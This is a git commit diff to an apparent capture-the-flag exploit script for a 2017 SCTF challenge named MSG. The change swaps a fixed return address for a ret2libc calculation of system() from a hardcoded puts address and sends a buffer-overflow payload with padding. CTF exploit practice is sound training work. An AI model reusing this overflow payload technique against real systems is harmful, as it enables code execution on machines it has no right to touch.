854b2087d616e3d414d6e13cbf2407efb44b6436
DelspoN <delsponn@gmail.com>
2017-07-17 09:07:41 +0900

    new files added

--- sctf2017/MSG/ex.py
+++ sctf2017/MSG/ex.py
@@ -11,7 +11,12 @@ print p.recvuntil("Msg ID : ")
 msgid = p.recvline()
 print msgid
 print p.recv()
-ret = p32(0x08048aa4)
+
+libc = ELF("/lib/i386-linux-gnu/libc.so.6")
+ret = 0xf7e75ca0 - libc.symbols['puts'] + libc.symbols['system']
+# 0xf7e75ca0 is got address of puts
+ret = p32(ret)
+
 p.sendline(" !"+"a"*(276-2-len('This string is invalid string... : '))+ret)
 # return to sub_8048aa4() ; maybe 'msg : ' is printed
 print p.recv()
